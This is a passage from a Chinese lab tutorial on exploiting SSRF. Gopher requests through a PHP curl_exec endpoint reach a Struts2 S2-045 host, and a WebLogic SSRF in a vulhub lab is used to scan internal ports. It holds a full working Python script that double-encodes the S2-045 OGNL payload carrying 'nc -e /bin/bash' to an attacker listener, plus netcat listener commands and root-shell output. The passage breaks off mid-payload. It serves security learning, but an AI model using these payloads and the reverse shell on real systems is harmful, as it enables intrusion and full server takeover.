&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;C:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\D&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ocuments&lt;&#x2F;span&gt;&lt;span&gt; and Settings&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\A&lt;&#x2F;span&gt;&lt;span&gt;dministrator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\桌&lt;&#x2F;span&gt;&lt;span&gt;面&amp;gt;nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -lp&lt;&#x2F;span&gt;&lt;span&gt; 6666
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;abc
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;现在我们想，如何使用SSRF漏洞配合gopher协议来获取shell呢？我们的环境如下&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624628840748-61e0e10e-f214-4fa7-9e0f-a0decad75f91.png#align=left&amp;amp;display=inline&amp;amp;height=1228&amp;amp;id=ue51efcce&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1228&amp;amp;originWidth=2243&amp;amp;size=1493101&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2243&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;上图就不具体说了，是一个典型的ssrf利用的解释图。&lt;br &#x2F;&gt;在使用ssrf去获取struts2的shell时，遇到了两次困难：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;PHP的curl_exec函数没有发起gopher的请求（这个问题上面已经说过）&lt;&#x2F;li&gt;
&lt;li&gt;gopher一直请求不到目标页面&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;根据我的试错经历，我梳理了下如何一步步的完成gopher请求获取shell。&lt;br &#x2F;&gt;首先我们先做一些简单的事情，顺序如下：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;使用ssrf漏洞发起gopher请求，访问前面用到的get.php&lt;&#x2F;li&gt;
&lt;li&gt;使用ssrf漏洞发起gopher请求，获取struts2主机的shell&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;strong&gt;第一步&lt;&#x2F;strong&gt;：&lt;br &#x2F;&gt;准备好访问get.php的数据包（&lt;strong&gt;照搬的本文开始的包&lt;&#x2F;strong&gt;）&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20&#x2F;ssrf&#x2F;base&#x2F;get.php%3fname=Margin%20HTTP&#x2F;1.1%0d%0AHost:%20192.168.0.109%0d%0A
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;那我们现在是否可以这样来组成我们的URL？&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20&#x2F;ssrf&#x2F;base&#x2F;get.php%3fname=Margin%20HTTP&#x2F;1.1%0d%0AHost:%20192.168.0.109%0d%0A
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;我们来测试下，结果如下：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624628998687-54fa0449-5416-4048-ad52-696f640d2836.png#align=left&amp;amp;display=inline&amp;amp;height=151&amp;amp;id=ufa816635&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=151&amp;amp;originWidth=2243&amp;amp;size=111812&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2243&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;发现并没有出现get页面的hello Margin，说明请求失败，这个地方卡了一会，发现是因为在PHP在接收到参数后会做一次URL的解码，正如我们上图所看到的，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。编码结果如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=gopher%3A%2F%2F192.168.0.109%3A80%2F_GET%2520%2Fssrf%2Fbase%2Fget.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.0.109%250d%250A
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;此时发起请求，得到如下结果：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624629042684-80911512-fba1-4f86-aec4-9ec7195b50fd.png#align=left&amp;amp;display=inline&amp;amp;height=166&amp;amp;id=u7602c9d5&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=166&amp;amp;originWidth=2243&amp;amp;size=189656&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2243&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;发现已经正常，此时便说明我们的环境没有问题，SSRF漏洞利用正常，开始接下来的步骤。&lt;br &#x2F;&gt;&lt;strong&gt;第二步&lt;&#x2F;strong&gt;：&lt;br &#x2F;&gt;准备好struts2-045漏洞的利用代码，并进行二次编码，需要注意的是Content-Type中放了主要的漏洞利用代码，并且特殊字符多，将其单独进行编码，步骤如下：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;将gopher协议一直到Content-Type进行二次编码&lt;&#x2F;li&gt;
&lt;li&gt;将Content-Type的值所有字符进行URL二次编码&lt;br &#x2F;&gt;最终得到如下结果(太长，不列中间内容，省略部分为Content-type内容)：&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;gopher%3A%2F%2F192.168.0.119%3A8080%2F_GET%2520%2FS2-045%2F%2520HTTP%2F1.1%250d%250aHost%3A192.168.0.119%250d%250aContent-Type%3A ......... %0d%0a
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;最终可以获取shell，结果如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -l&lt;&#x2F;span&gt;&lt;span&gt; 6666
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;id
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;uid&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;) gid=0(root) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;groups&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;在试错的过程中发现：URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;最后附上编码脚本（python2.7）：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# -*- coding: UTF-8 -*-
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib2,urllib
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;header = &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gopher:&#x2F;&#x2F;192.168.0.119:8080&#x2F;_GET &#x2F;S2-045&#x2F; HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Host:192.168.0.119
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Type:&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;cmd = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;nc -e &#x2F;bin&#x2F;bash 192.168.0.109 6666&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;content_type = &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;%{(#_=&amp;#39;multipart&#x2F;form-data&amp;#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&amp;#39;com.opensymphony.xwork2.ActionContext.container&amp;#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;+cmd+&amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;).(#iswin=(@java.lang.System@getProperty(&amp;#39;os.name&amp;#39;).toLowerCase().contains(&amp;#39;win&amp;#39;))).(#cmds=(#iswin?{&amp;#39;cmd.exe&amp;#39;,&amp;#39;&#x2F;c&amp;#39;,#cmd}:{&amp;#39;&#x2F;bin&#x2F;bash&amp;#39;,&amp;#39;-c&amp;#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;header_encoder = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;content_type_encoder = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;content_type_encoder_2 = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;url_char = [&amp;quot; &amp;quot;]
&lt;&#x2F;span&gt;&lt;span&gt;nr = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 编码请求头
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;single_char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;header:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;single_char in url_char:
&lt;&#x2F;span&gt;&lt;span&gt;        header_encoder += urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(single_char,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;),&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        header_encoder += single_char
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;header_encoder = header_encoder.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(nr,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;),&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 编码content-type，第一次编码
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;single_char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;content_type:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 先转为ASCII,在转十六进制即可变为URL编码
&lt;&#x2F;span&gt;&lt;span&gt;    content_type_encoder += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(single_char)))
&lt;&#x2F;span&gt;&lt;span&gt;content_type_encoder = content_type_encoder.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;) + urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(nr,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 编码content-type，第二次编码
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;single_char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;content_type_encoder:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 先转为ASCII,在转十六进制即可变为URL编码
&lt;&#x2F;span&gt;&lt;span&gt;    content_type_encoder_2 += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(single_char)))
&lt;&#x2F;span&gt;&lt;span&gt;content_type_encoder_2 = content_type_encoder_2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;exp = url + header_encoder + content_type_encoder_2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;exp
&lt;&#x2F;span&gt;&lt;span&gt;request = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Request&lt;&#x2F;span&gt;&lt;span&gt;(exp)
&lt;&#x2F;span&gt;&lt;span&gt;response = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;urlopen&lt;&#x2F;span&gt;&lt;span&gt;(request).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;response
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;li-yong-weblogicde-ssrflou-dong-tan-ce-nei-wang-bing-fan-hui-shell&quot;&gt;利用weblogic的SSRF漏洞探测内网并返回shell&lt;&#x2F;h2&gt;
&lt;p&gt;这里环境采用vulhub的docker环境，在centos虚拟机中启动docker-compose，centOS的IP地址为192.168.31.185&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;利用ssrf探测内网&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;打开环境&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624738117514-8b415229-4596-459b-b830-ec145a5bae1c.png#align=left&amp;amp;display=inline&amp;amp;height=912&amp;amp;id=u55b146ff&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_04-08-06.png&amp;amp;originHeight=912&amp;amp;originWidth=1920&amp;amp;size=77843&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1920&quot; alt=&quot;Snipaste_2021-06-27_04-08-06.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在三个输入框中随便填入几个数字，点击search，页面回显如上图所示，此ssrf注入点就在这里&lt;br &#x2F;&gt;抓包&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624738213522-153972bf-070f-4aa5-aa6a-8535e3066719.png#align=left&amp;amp;display=inline&amp;amp;height=983&amp;amp;id=u0b4d8a25&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_04-07-11.png&amp;amp;originHeight=983&amp;amp;originWidth=1694&amp;amp;size=149407&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1694&quot; alt=&quot;Snipaste_2021-06-27_04-07-11.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在包中发现 operator 字样，其中的URL地址 www-3.ibm.com 同刚才页面回显中的一致，将 operator 的值修改为 172.18.0.2:80 ，发包&lt;br &#x2F;&gt;结果如下图右侧所示&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624738435051-b1e061f1-9c67-4c07-ad5b-1c179d4c2f13.png#align=left&amp;amp;display=inline&amp;amp;height=983&amp;amp;id=u37d95ad4&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_04-13-32.png&amp;amp;originHeight=983&amp;amp;originWidth=1694&amp;amp;size=164786&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1694&quot; alt=&quot;Snipaste_2021-06-27_04-13-32.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;“cannot connect”，所以172.18.0.2的80端口并没有开放&lt;br &#x2F;&gt;我们把80改为6379，结果如下&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624738533076-d54ad861-f705-4311-a1c5-fe8d2223db71.png#align=left&amp;amp;display=inline&amp;amp;height=983&amp;amp;id=ucee94c98&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_04-06-26.png&amp;amp;originHeight=983&amp;amp;originWidth=1694&amp;amp;size=166813&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1694&quot; alt=&quot;Snipaste_2021-06-27_04-06-26.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;此结果证明172.18.0.2的6379端口是开放的&lt;&#x2F;p&gt;
&lt;p&gt;这里可以使用burp来爆破端口&lt;br &#x2F;&gt;设置好变量&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624738776904-dbc217c7-4bd7-44ed-be5a-c26c54c5b8ae.png#align=left&amp;amp;display=inline&amp;amp;height=983&amp;amp;id=ued6e0916&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_04-19-00.png&amp;amp;originHeight=983&amp;amp;originWidth=1694&amp;amp;size=115734&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1694&quot; alt=&quot;Snipaste_2021-06-27_04-19-00.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;设置爆破1-10000端口&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624738803443-d30bcf91-4005-46c0-a59e-6c7e4992222d.png#align=left&amp;amp;display=inline&amp;amp;height=983&amp;amp;id=u988823ae&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_04-19-14.png&amp;amp;originHeight=983&amp;amp;originWidth=1694&amp;amp;size=63569&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1694&quot; alt=&quot;Snipaste_2021-06-27_04-19-14.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;以length排序后，可以立马发现6379端口&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624738999467-146d6913-6620-4a05-8f92-bae26ab2feb4.png#align=left&amp;amp;display=inline&amp;amp;height=778&amp;amp;id=u106c439c&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_04-22-00.png&amp;amp;originHeight=778&amp;amp;originWidth=1049&amp;amp;size=35121&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1049&quot; alt=&quot;Snipaste_2021-06-27_04-22-00.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;也可以通过python脚本实现……&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;反弹shell&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;首先在主机192.168.31.73（kali）启动nc监听&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc -lvnp&lt;&#x2F;span&gt;&lt;span&gt; 10000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624741363484-ef01dc2f-82f4-48d2-bd44-53e320f4b920.png#align=left&amp;amp;display=inline&amp;amp;height=61&amp;amp;id=vYTVZ&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_05-02-32.png&amp;amp;originHeight=61&amp;amp;originWidth=389&amp;amp;size=3231&amp;amp;status=done&amp;amp;style=none&amp;amp;width=389&quot; alt=&quot;Snipaste_2021-06-27_05-02-32.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;然后这里我们使用如下反弹shell的脚本&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;test&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;A&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;D&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;A
&lt;&#x2F;span&gt;&lt;span&gt;
